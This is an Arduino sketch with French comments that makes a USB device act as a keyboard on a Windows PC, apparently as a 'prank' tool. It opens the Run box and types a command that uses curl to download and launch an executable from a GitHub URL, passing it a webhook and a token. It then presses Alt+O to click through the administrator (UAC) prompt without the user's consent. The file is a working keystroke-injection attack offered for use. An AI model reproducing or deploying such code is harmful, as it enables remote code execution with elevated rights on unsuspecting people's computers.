// Librairie requise : HID-Project by NicoHood
// Arduino IDE → Gestionnaire de bibliotheques → rechercher "HID-Project" → Installer
#include <HID-Project.h>
#include <HID-Settings.h>

// ─── A configurer avant de flasher ───────────────────────────────────────────
#define WEBHOOK   "VOTRE_WEBHOOK_ICI"
#define TOKEN     "VOTRE_TOKEN_ICI"
#define SETUP_URL "https://github.com/lamziiii/prank-server/releases/latest/download/setup.exe"

// Delai avant que Windows reconnaisse l'Arduino comme clavier (ms)
#define BOOT_DELAY  3500

// Delai apres la commande avant d'accepter l'UAC (ajuster selon vitesse reseau)
// 8000ms = ok connexion rapide, monter a 15000 si lent
#define UAC_DELAY   8000
// ─────────────────────────────────────────────────────────────────────────────

void setup() {
  delay(BOOT_DELAY);

  // KeyboardLayout_fr_FR : HID-Project envoie les keycodes AZERTY corrects
  // pour chaque caractere. Le PC cible en AZERTY reçoit exactement le bon caractere,
  // sans que Windows ait besoin de re-mapper quoi que ce soit.
  Keyboard.begin(KeyboardLayout_fr_FR);

  // Win+R — ouvrir la boite Executer
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(100);
  Keyboard.releaseAll();
  delay(900);

  // Commande : telecharger setup.exe et le lancer avec les credentials
  // setup.exe a un manifest requireAdministrator → declenchera l'UAC lui-meme
  Keyboard.print("cmd /c curl -sLo %TEMP%\\s.exe ");
  Keyboard.print(SETUP_URL);
  Keyboard.print(" && %TEMP%\\s.exe -w \"");
  Keyboard.print(WEBHOOK);
  Keyboard.print("\" -t \"");
  Keyboard.print(TOKEN);
  Keyboard.print("\"");
  delay(100);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  // Attendre : ouverture cmd + telechargement + apparition UAC
  delay(UAC_DELAY);

  // Alt+O → accepter l'UAC "Oui" en français
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('o');
  delay(100);
  Keyboard.releaseAll();

  Keyboard.end();
}

void loop() {}
